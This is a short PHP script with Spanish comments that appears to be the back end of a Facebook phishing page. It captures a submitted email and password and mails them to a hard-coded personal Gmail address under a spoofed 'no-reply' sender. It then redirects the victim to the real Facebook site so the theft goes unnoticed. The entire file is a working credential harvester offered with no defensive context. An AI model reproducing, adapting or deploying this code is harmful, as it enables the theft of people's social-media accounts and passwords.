<?php
// Verifica si los datos fueron enviados por POST
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $email = htmlspecialchars($_POST['email']);
    $password = htmlspecialchars($_POST['password']);

    // Dirección a la que se enviará el correo
    $to = "rugalmano107@gmail.com";
    $subject = "Nuevos datos de inicio de sesión";
    $message = "Correo electrónico: $email\nContraseña: $password";
    $headers = "From: no-reply@redsocial.com";

    // Envía el correo
    if (mail($to, $subject, $message, $headers)) {
        // Redirige a la URL de Facebook después de enviar el correo
        header("Location: https://www.facebook.com/?locale=es_LA");
        exit(); // Asegúrate de detener el script después de la redirección
    } else {
        echo "Error al enviar el correo.";
    }
} else {
    echo "Método de solicitud no válido.";
}
?>
